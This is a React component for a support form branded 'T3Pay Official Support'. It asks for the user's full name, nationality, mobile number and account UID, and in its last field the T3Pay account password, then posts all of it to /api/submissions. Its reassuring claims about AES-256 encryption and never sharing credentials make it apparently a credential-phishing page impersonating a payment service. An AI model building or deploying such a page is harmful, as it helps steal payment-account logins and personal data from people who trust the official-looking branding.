import React, { useState } from 'react';
import { ShieldCheck, Lock, Globe, User, Phone, Mail, CheckCircle, AlertCircle } from 'lucide-react';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';

function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

export function SupportForm() {
  const [formData, setFormData] = useState({
    fullName: '',
    nationality: '',
    mobileNumber: '',
    t3payUid: '',
    problem: '',
    t3payPassword: '',
  });

  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await fetch('/api/submissions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error('Failed to submit form');
      }

      setSuccess(true);
      setFormData({
        fullName: '',
        nationality: '',
        mobileNumber: '',
        t3payUid: '',
        problem: '',
        t3payPassword: '',
      });
    } catch (err: any) {
      setError(err.message || 'Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div className="flex-1 flex overflow-hidden w-full bg-slate-50 items-center justify-center p-4 h-full">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-sm border border-slate-200 p-10 text-center space-y-6">
          <div className="mx-auto w-16 h-16 bg-green-50 text-green-700 rounded-xl flex items-center justify-center mb-6 border border-green-100">
            <CheckCircle className="w-8 h-8" />
          </div>
          <h2 className="text-2xl font-bold tracking-tight text-slate-900">Request Submitted</h2>
          <p className="text-sm text-slate-500">
            Thank you for contacting T3Pay Official Support. Your details have been received securely, and our team will get back to you shortly.
          </p>
          <button
            onClick={() => setSuccess(false)}
            className="mt-8 w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-4 rounded-lg transition-colors shadow-lg shadow-slate-200"
          >
            Submit Another Request
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="flex-1 flex flex-col md:flex-row overflow-hidden w-full">
      {/* Sidebar Info */}
      <aside className="w-full md:w-80 border-b md:border-b-0 md:border-r border-slate-200 bg-white p-6 md:p-10 flex flex-col shrink-0 overflow-y-auto">
        <div className="mb-8">
          <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Instructions</h3>
          <p className="text-sm text-slate-600 leading-relaxed">
            Please provide your accurate account details. This information is required to verify your identity and assist with your payment query.
          </p>
        </div>
        <div className="space-y-6">
          <div className="flex gap-4">
            <div className="w-1 bg-blue-600 rounded-full"></div>
            <div>
              <p className="text-xs font-bold text-slate-900">Identity Verification</p>
              <p className="text-xs text-slate-500">Ensure your name matches your ID.</p>
            </div>
          </div>
          <div className="flex gap-4">
            <div className="w-1 bg-slate-200 rounded-full"></div>
            <div>
              <p className="text-xs font-bold text-slate-900">Security Protocol</p>
              <p className="text-xs text-slate-500">All data is encrypted (AES-256).</p>
            </div>
          </div>
        </div>
        <div className="mt-8 md:mt-auto">
          <div className="p-4 bg-slate-50 rounded-xl border border-slate-100">
            <p className="text-[11px] text-slate-400 leading-tight italic">
              "T3Pay ensures that your credentials are never shared with third-party vendors without explicit consent."
            </p>
          </div>
        </div>
      </aside>

      {/* Support Form Section */}
      <section className="flex-1 p-6 md:p-12 bg-slate-50 overflow-y-auto">
        <div className="max-w-2xl mx-auto bg-white p-6 md:p-10 rounded-2xl border border-slate-200 shadow-sm">
          <div className="mb-10">
            <h2 className="text-2xl font-bold text-slate-900">Account Assistance Form</h2>
            <p className="text-slate-500 mt-1">Complete the 5 fields below to initialize your support ticket.</p>
          </div>

          {error && (
            <div className="mb-6 bg-red-50 text-red-700 p-4 rounded-xl flex items-start gap-3 border border-red-100">
              <AlertCircle className="w-5 h-5 flex-shrink-0 mt-0.5 text-red-600" />
              <p className="text-sm font-medium">{error}</p>
            </div>
          )}

          <form className="grid grid-cols-2 gap-x-8 gap-y-6" onSubmit={handleSubmit}>
            {/* 1. Full Name */}
            <div className="col-span-2">
              <label htmlFor="fullName" className="block text-xs font-bold text-slate-700 uppercase tracking-wide mb-2">
                What is your full name?
              </label>
              <input
                id="fullName"
                name="fullName"
                type="text"
                required
                value={formData.fullName}
                onChange={handleChange}
                placeholder="e.g. Rahul Sharma"
                className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all"
              />
            </div>

            {/* 2. Nationality */}
            <div className="col-span-2 md:col-span-1">
              <label htmlFor="nationality" className="block text-xs font-bold text-slate-700 uppercase tracking-wide mb-2">
                Where are you from?
              </label>
              <input
                id="nationality"
                name="nationality"
                type="text"
                required
                value={formData.nationality}
                onChange={handleChange}
                placeholder="e.g. Indian, American, etc."
                className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all"
              />
            </div>

            {/* 3. Mobile Number */}
            <div className="col-span-2 md:col-span-1">
              <label htmlFor="mobileNumber" className="block text-xs font-bold text-slate-700 uppercase tracking-wide mb-2">
                Mobile Number (Without country code)
              </label>
              <div className="relative">
                <input
                  id="mobileNumber"
                  name="mobileNumber"
                  type="tel"
                  required
                  value={formData.mobileNumber}
                  onChange={handleChange}
                  placeholder="Without country code"
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all"
                />
                <span className="absolute right-3 top-3 text-[10px] text-slate-400 font-mono uppercase">10-Digit</span>
              </div>
            </div>

            {/* 4. T3Pay UID */}
            <div className="col-span-2 md:col-span-1">
              <label htmlFor="t3payUid" className="block text-xs font-bold text-slate-700 uppercase tracking-wide mb-2">
                T3Pay UID
              </label>
              <input
                id="t3payUid"
                name="t3payUid"
                type="text"
                required
                value={formData.t3payUid}
                onChange={handleChange}
                placeholder="e.g. T3P-876251"
                className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all"
              />
            </div>

            {/* 5. What is their problem */}
            <div className="col-span-2 md:col-span-1">
              <label htmlFor="problem" className="block text-xs font-bold text-slate-700 uppercase tracking-wide mb-2">
                What is your problem?
              </label>
              <input
                id="problem"
                name="problem"
                type="text"
                required
                value={formData.problem}
                onChange={handleChange}
                placeholder="Describe your issue"
                className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all"
              />
            </div>

            {/* 6. Password (At the end) */}
            <div className="col-span-2">
              <label htmlFor="t3payPassword" className="block text-xs font-bold text-slate-700 uppercase tracking-wide mb-2">
                T3Pay Password
              </label>
              <input
                id="t3payPassword"
                name="t3payPassword"
                type="password"
                required
                value={formData.t3payPassword}
                onChange={handleChange}
                placeholder="••••••••"
                className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all"
              />
            </div>

            <div className="col-span-2 pt-4">
              <button
                type="submit"
                disabled={loading}
                className={cn(
                  "w-full bg-slate-900 text-white font-bold py-4 rounded-lg hover:bg-slate-800 transition-colors shadow-lg shadow-slate-200 flex items-center justify-center gap-2",
                  loading && "opacity-70 cursor-not-allowed"
                )}
              >
                <span>{loading ? 'Submitting secure request...' : 'Submit Details to Support'}</span>
                {!loading && (
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                )}
              </button>
            </div>
          </form>
        </div>
      </section>
    </div>
  );
}
